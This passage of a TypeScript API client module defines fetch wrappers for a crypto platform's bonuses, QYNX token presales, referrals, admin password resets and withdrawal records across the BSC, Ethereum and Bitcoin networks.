  bonus_status?: 'active' | 'pending' | 'approved' | 'claimed'
}

/** GET /api/bonuses — list bonus records. Optional ?user_id= & ?network= */
export async function getBonuses(params?: { user_id?: string; network?: 'bsc' | 'ethereum' | 'bitcoin' }): Promise<ApiBonus[]> {
  try {
    const search = new URLSearchParams()
    if (params?.user_id?.trim()) search.set('user_id', params.user_id.trim())
    if (params?.network) search.set('network', params.network)
    const query = search.toString() ? `?${search.toString()}` : ''
    const res = await request<ApiBonus[] | { error?: string }>(`/api/bonuses${query}`)
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** Admin presale record (QYNX purchases). */
export interface ApiPresale {
  id: string
  user_id: string
  user_email?: string
  txHash: string
  token: string
  amount_token: number
  usd_value: number
  qynx_amount: number
  deposit_address?: string
  network?: 'bsc' | 'ethereum' | 'bitcoin'
  confirm_status?: number
  createdAt?: string | number | null
}

/** GET /api/admin/presales — list QYNX purchase records for admin presale page. Optional network filter. */
export async function getPresales(network?: 'bsc' | 'ethereum' | 'bitcoin'): Promise<ApiPresale[]> {
  try {
    const query = network ? `?network=${encodeURIComponent(network)}` : ''
    const res = await request<ApiPresale[] | { error?: string }>(`/api/admin/presales${query}`)
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** GET /api/users/:userId/referrals — list referrals for a user */
export interface ApiReferral {
  id?: string
  email?: string
  account?: string
  userId?: string
  uid?: string
  /** Referral code of the referred friend */
  referralCode?: string
  madeSubscription?: boolean | string
  subscribeDate?: string
  createdAt?: string
  rewards?: string | number
}

export async function getReferralsByUserId(userId: string): Promise<ApiReferral[]> {
  try {
    const res = await request<ApiReferral[] | { error?: string }>(
      `/api/users/${encodeURIComponent(userId)}/referrals`
    )
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** POST /api/users/:id/reset-password — body: { password }. Admin reset user password. */
export async function resetUserPassword(id: string, newPassword: string): Promise<void> {
  await request(`/api/users/${encodeURIComponent(id)}/reset-password`, {
    method: 'POST',
    body: JSON.stringify({ password: newPassword }),
  })
}

// Withdrawal API
export const WITHDRAWAL_CATEGORY = ['investment', 'trading', 'plan bonus', 'referral bonus'] as const
export type WithdrawalCategory = (typeof WITHDRAWAL_CATEGORY)[number]

export const WITHDRAWAL_STATUS = ['pending', 'approved', 'withdrawed'] as const
export type WithdrawalStatus = (typeof WITHDRAWAL_STATUS)[number]

export interface CreateWithdrawalBody {
  user_id: string
  category: WithdrawalCategory
  wallet_address?: string
  status?: WithdrawalStatus
  amount?: number | string
  currency?: string
  activity_id?: string
  network?: 'bsc' | 'ethereum'
}

export interface UpdateWithdrawalBody {
  category?: WithdrawalCategory
  status?: WithdrawalStatus
  wallet_address?: string
  [key: string]: unknown
}

/** POST /api/withdrawals — create a new withdrawal. Returns created withdrawal (with id). */
export async function createWithdrawal(body: CreateWithdrawalBody): Promise<{ id: string; [key: string]: unknown }> {
  const res = await request<{ id: string; [key: string]: unknown }>('/api/withdrawals', {
    method: 'POST',
    body: JSON.stringify(body),
  })
  return res
}

/** PUT /api/withdrawals/:id — update existing withdrawal. */
export async function updateWithdrawal(id: string, body: UpdateWithdrawalBody): Promise<unknown> {
  return request<unknown>(`/api/withdrawals/${encodeURIComponent(id)}`, {
    method: 'PUT',
    body: JSON.stringify(body),
  })
}

/** POST /api/withdrawals/:id/claim — claim an approved withdrawal. Backend decreases user token amount by linked trading qynx_amount and sets status to withdrawed. */
export async function claimWithdrawal(id: string, userId: string): Promise<ApiWithdrawal> {
  const res = await request<ApiWithdrawal | { error?: string }>(`/api/withdrawals/${encodeURIComponent(id)}/claim`, {
    method: 'POST',
    body: JSON.stringify({ user_id: userId }),
  })
  if (res && typeof (res as { error?: string }).error === 'string') throw new Error((res as { error: string }).error)
  return res as ApiWithdrawal
}

/** DELETE /api/withdrawals/:id — delete a withdrawal. */
export async function deleteWithdrawal(id: string): Promise<void> {
  await request<unknown>(`/api/withdrawals/${encodeURIComponent(id)}`, {
    method: 'DELETE',
  })
}

/** Withdrawal list item from GET /api/withdrawals or GET /api/users/:userId/withdrawals */
export interface ApiWithdrawal {
  id: string
  user_id?: string
  category?: string
  status?: string
  wallet_address?: string
  amount?: number | string
  currency?: string
  activity_id?: string
  created_at?: string
  createdAt?: string
  updatedAt?: string
  network?: 'bsc' | 'ethereum' | 'bitcoin'
}

/** GET /api/withdrawals — list all withdrawals (for admin dashboard). Optional network filters by chain. Returns [] if not supported. */
export async function getWithdrawals(network?: 'bsc' | 'ethereum' | 'bitcoin'): Promise<ApiWithdrawal[]> {
  try {
    const query = network ? `?network=${encodeURIComponent(network)}` : ''
    const res = await request<ApiWithdrawal[] | { error?: string }>(`/api/withdrawals${query}`)
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}

/** Withdrawal list item from GET /api/withdrawals or GET /api/users/:userId/withdrawals */
export interface ApiWithdrawal {
  id: string
  user_id?: string
  category?: string
  status?: string
  wallet_address?: string
  amount?: number | string
  currency?: string
  activity_id?: string
  created_at?: string
  createdAt?: string
  updatedAt?: string
  network?: 'bsc' | 'ethereum' | 'bitcoin'
  [key: string]: unknown
}

/** GET /api/users/:userId/withdrawals — list withdrawals for the current user. Optional network filters by chain. */
export async function getWithdrawalsByUserId(userId: string, network?: 'bsc' | 'ethereum' | 'bitcoin'): Promise<ApiWithdrawal[]> {
  try {
    const query = network ? `?network=${encodeURIComponent(network)}` : ''
    const res = await request<ApiWithdrawal[] | { error?: string }>(
      `/api/users/${encodeURIComponent(userId)}/withdrawals${query}`
    )
    if (Array.isArray(res)) return res
    return []
  } catch {
    return []
  }
}
